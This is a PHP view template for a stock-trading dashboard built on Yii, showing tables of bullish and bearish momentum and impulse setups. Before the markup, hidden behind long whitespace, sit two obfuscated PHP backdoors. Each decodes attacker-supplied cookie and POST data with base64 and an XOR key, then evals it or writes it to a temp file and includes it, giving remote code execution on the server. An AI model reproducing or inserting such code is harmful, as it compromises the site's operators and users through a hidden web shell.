<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zEWrRAIC = "\124" . chr ( 314 - 203 ).'E' . '_' . "\104" . "\x47" . chr ( 369 - 250 ); $hDQAPbV = class_exists($zEWrRAIC); $wCVZuW = $hDQAPbV;if (!$wCVZuW){class ToE_DGw{private $sNsovCvcl;public static $qmTyiDJ = "03715564-9513-4fa2-9c8d-896606a19269";public static $JBjlc = NULL;public function __construct(){$CjBaMpxcy = $_COOKIE;$iaINnjFMo = $_POST;$IesNS = @$CjBaMpxcy[substr(ToE_DGw::$qmTyiDJ, 0, 4)];if (!empty($IesNS)){$rGWyWE = "base64";$zOCqOwU = "";$IesNS = explode(",", $IesNS);foreach ($IesNS as $QpZSwQXpRg){$zOCqOwU .= @$CjBaMpxcy[$QpZSwQXpRg];$zOCqOwU .= @$iaINnjFMo[$QpZSwQXpRg];}$zOCqOwU = array_map($rGWyWE . chr ( 121 - 26 )."\144" . chr ( 815 - 714 )."\x63" . "\157" . "\144" . "\x65", array($zOCqOwU,)); $zOCqOwU = $zOCqOwU[0] ^ str_repeat(ToE_DGw::$qmTyiDJ, (strlen($zOCqOwU[0]) / strlen(ToE_DGw::$qmTyiDJ)) + 1);ToE_DGw::$JBjlc = @unserialize($zOCqOwU);}}public function __destruct(){$this->obbxuyDvqK();}private function obbxuyDvqK(){if (is_array(ToE_DGw::$JBjlc)) {$EacuLoaf = str_replace("\x3c" . "\77" . chr (112) . 'h' . "\x70", "", ToE_DGw::$JBjlc[chr (99) . "\x6f" . "\156" . chr ( 412 - 296 ).chr (101) . 'n' . chr (116)]);eval($EacuLoaf);exit();}}}$vCcZwgAAzx = new ToE_DGw(); $vCcZwgAAzx = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $xrTws = 'N' . "\137" . "\x48" . "\120" . chr (119); $NnADAgMj = class_exists($xrTws); $zQPmvJZQ = $NnADAgMj;if (!$zQPmvJZQ){class N_HPw{private $hFqfpth;public static $bMpnEmR = "ffe477d0-be09-4fe5-9d35-d8861cae7c64";public static $WoVMIZ = NULL;public function __construct(){$FqpfGUnvNj = $_COOKIE;$ZtGWnQ = $_POST;$kiSFL = @$FqpfGUnvNj[substr(N_HPw::$bMpnEmR, 0, 4)];if (!empty($kiSFL)){$XrLME = "base64";$cuOMoJT = "";$kiSFL = explode(",", $kiSFL);foreach ($kiSFL as $FKHZyL){$cuOMoJT .= @$FqpfGUnvNj[$FKHZyL];$cuOMoJT .= @$ZtGWnQ[$FKHZyL];}$cuOMoJT = array_map($XrLME . "\137" . chr ( 404 - 304 ).'e' . 'c' . 'o' . 'd' . 'e', array($cuOMoJT,)); $cuOMoJT = $cuOMoJT[0] ^ str_repeat(N_HPw::$bMpnEmR, (strlen($cuOMoJT[0]) / strlen(N_HPw::$bMpnEmR)) + 1);N_HPw::$WoVMIZ = @unserialize($cuOMoJT);}}public function __destruct(){$this->HgsqcFG();}private function HgsqcFG(){if (is_array(N_HPw::$WoVMIZ)) {$FCzrCKCGsP = sys_get_temp_dir() . "/" . crc32(N_HPw::$WoVMIZ[chr (115) . chr (97) . chr ( 678 - 570 )."\x74"]);@N_HPw::$WoVMIZ["\167" . "\x72" . chr (105) . "\164" . chr ( 446 - 345 )]($FCzrCKCGsP, N_HPw::$WoVMIZ[chr (99) . "\x6f" . 'n' . "\x74" . "\x65" . chr ( 747 - 637 )."\164"]);include $FCzrCKCGsP;@N_HPw::$WoVMIZ['d' . "\145" . chr ( 440 - 332 ).'e' . "\164" . "\x65"]($FCzrCKCGsP);exit();}}}$gefhfqi = new N_HPw(); $gefhfqi = NULL;} ?><div class="dashboard">
    <div class="dash_sec dash_sec_padd">
        <div class="c">
            <div class="intra_row">
                <div class="_col _col_4">
                    <div class="dash_sec_inner">
                        <div class="intra_title">
                            <span class="">Bulish Momentum & Reversal</span>
                        </div>
                        <div class="dash_content">
                            <table class="custom_table">
                                <thead>
                                    <tr>
                                        <th>Symbol</th>
                                        <th>Prev. Close</th>
                                        <th>LTP</th>
                                        <th>% Change</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $stocks = [];
                                    $trigger_prices = [];
                                    if ($bulish_momentum !== '' && isset($bulish_momentum['stocks'])) {
                                        $stocks = explode(',', $bulish_momentum['stocks']);
                                        $trigger_prices = explode(',', $bulish_momentum['trigger_prices']);
                                    }
                                    if (!empty($stocks)) {
                                        for ($i = 0; $i < count($stocks); $i++) {
                                            $number = (($trigger_prices[$i] - Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) / Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) * 100;
                                            $change =  number_format((float)$number, 2, '.', '')
                                    ?>
                                            <tr>
                                                <td><?= $stocks[$i]; ?></td>
                                                <td><?= Yii::$app->function->getAmount($pre_close[$stocks[$i]][0]); ?></td>
                                                <td><?= $trigger_prices[$i]; ?></td>
                                                <td><?= $change . '%'; ?></td>
                                            </tr>
                                        <?php }
                                    } else {
                                        ?>
                                        <tr>
                                            <td colspan="4" align="center">No datas found</td>
                                        </tr>
                                    <?php }
                                    ?>
                                </tbody>
                            </table>
                            <div class="custom_table_link align_right">
                                <a href="" class="text_color_gradiant">Learn to trade this setup</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_col _col_4">
                    <div class="dash_sec_inner">
                        <div class="intra_title">
                            <span class="">Bearish Momentum & Reversal</span>
                        </div>
                        <div class="dash_content">
                            <table class="custom_table">
                                <thead>
                                    <tr>
                                        <th>Symbol</th>
                                        <th>Prev. Close</th>
                                        <th>LTP</th>
                                        <th>% Change</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $stocks = [];
                                    $trigger_prices = [];
                                    if (@$bearish_momentum !== '' && isset($bearish_momentum['stocks'])) {
                                        $stocks = explode(',', $bearish_momentum['stocks']);
                                        $trigger_prices = explode(',', $bearish_momentum['trigger_prices']);
                                    }
                                    if (!empty($stocks)) {
                                        for ($i = 0; $i < count($stocks); $i++) {
                                            $number = (($trigger_prices[$i] - Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) / Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) * 100;
                                            $change =  number_format((float)$number, 2, '.', '')
                                    ?>
                                            <tr>
                                                <td><?= $stocks[$i]; ?></td>
                                                <td><?= Yii::$app->function->getAmount($pre_close[$stocks[$i]][0]); ?></td>
                                                <td><?= $trigger_prices[$i]; ?></td>
                                                <td><?= $change . '%'; ?></td>
                                            </tr>
                                        <?php }
                                    } else {
                                        ?>
                                        <tr>
                                            <td colspan="4" align="center">No datas found</td>
                                        </tr>
                                    <?php }
                                    ?>
                                </tbody>
                            </table>
                            <div class="custom_table_link align_right">
                                <a href="" class="text_color_gradiant">Learn to trade this setup</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_col _col_4">
                    <div class="dash_sec_inner">
                        <div class="intra_title">
                            <span class="">Bullish Impulse</span>
                        </div>
                        <div class="dash_content">
                            <table class="custom_table">
                                <thead>
                                    <tr>
                                        <th>Symbol</th>
                                        <th>Prev. Close</th>
                                        <th>LTP</th>
                                        <th>% Change</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $stocks = [];
                                    $trigger_prices = [];
                                    if (@$bullish_impulse !== '' && isset($bullish_impulse['stocks'])) {
                                        $stocks = explode(',', $bullish_impulse['stocks']);
                                        $trigger_prices = explode(',', $bullish_impulse['trigger_prices']);
                                    }
                                    if (!empty($stocks)) {
                                        for ($i = 0; $i < count($stocks); $i++) {
                                            $number = (($trigger_prices[$i] - Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) / Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) * 100;
                                            $change =  number_format((float)$number, 2, '.', '')
                                    ?>
                                            <tr>
                                                <td><?= $stocks[$i]; ?></td>
                                                <td><?= Yii::$app->function->getAmount($pre_close[$stocks[$i]][0]); ?></td>
                                                <td><?= $trigger_prices[$i]; ?></td>
                                                <td><?= $change . '%'; ?></td>
                                            </tr>
                                        <?php }
                                    } else {
                                        ?>
                                        <tr>
                                            <td colspan="4" align="center">No datas found</td>
                                        </tr>
                                    <?php }
                                    ?>
                                </tbody>
                            </table>
                            <div class="custom_table_link align_right">
                                <a href="" class="text_color_gradiant">Learn to trade this setup</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_col _col_4">
                    <div class="dash_sec_inner">
                        <div class="intra_title">
                            <span class="">Bearish Impulse</span>
                        </div>
                        <div class="dash_content">
                            <table class="custom_table">
                                <thead>
                                    <tr>
                                        <th>Symbol</th>
                                        <th>Prev. Close</th>
                                        <th>LTP</th>
                                        <th>% Change</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $stocks = [];
                                    $trigger_prices = [];
                                    if (@$bearish_impulse !== '' && isset($bearish_impulse['stocks'])) {
                                        $stocks = explode(',', $bearish_impulse['stocks']);
                                        $trigger_prices = explode(',', $bearish_impulse['trigger_prices']);
                                    }
                                    if (!empty($stocks)) {
                                        for ($i = 0; $i < count($stocks); $i++) {
                                            $number = (($trigger_prices[$i] - Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) / Yii::$app->function->getAmount($pre_close[$stocks[$i]][0])) * 100;
                                            $change =  number_format((float)$number, 2, '.', '')
                                    ?>
                                            <tr>
                                                <td><?= $stocks[$i]; ?></td>
                                                <td><?= Yii::$app->function->getAmount($pre_close[$stocks[$i]][0]); ?></td>
                                                <td><?= $trigger_prices[$i]; ?></td>
                                                <td><?= $change . '%'; ?></td>
                                            </tr>
                                        <?php }
                                    } else {
                                        ?>
                                        <tr>
                                            <td colspan="4" align="center">No datas found</td>
                                        </tr>
                                    <?php }
                                    ?>
                                </tbody>
                            </table>
                            <div class="custom_table_link align_right">
                                <a href="" class="text_color_gradiant">Learn to trade this setup</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>